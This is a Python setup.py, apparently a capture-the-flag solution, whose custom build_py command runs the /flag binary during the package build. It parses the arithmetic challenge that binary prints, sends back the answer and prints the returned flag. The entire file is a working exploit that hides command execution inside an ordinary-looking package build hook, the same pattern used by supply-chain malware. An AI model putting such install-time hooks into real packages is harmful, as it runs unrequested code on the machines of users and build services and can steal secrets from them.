# setup.py
from setuptools import setup
from setuptools.command.build_py import build_py
import subprocess
import re

class CustomBuildCommand(build_py):
    def run(self):
        try:
            proc = subprocess.Popen(['/flag'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
            question = proc.stdout.readline()
            print(question)
            numbers = list(map(int, re.findall(r'\d+', question)))
            if len(numbers) == 3:
                A, B, C = numbers
                answer = A * B + C
                proc.stdin.write(f'{answer}\n')
                proc.stdin.flush()
                flag = proc.stdout.readline()
                print(flag)
            else:
                print('Failed to parse question')
        except Exception as e:
            print(f"Error: {e}")
        # Continue with the standard build process
        build_py.run(self)

setup(
    name='pyramid2_solution',
    version='0.0.6',  # Incremented version
    packages=['pyramid2_solution'],
    cmdclass={
        'build_py': CustomBuildCommand,
    },
)
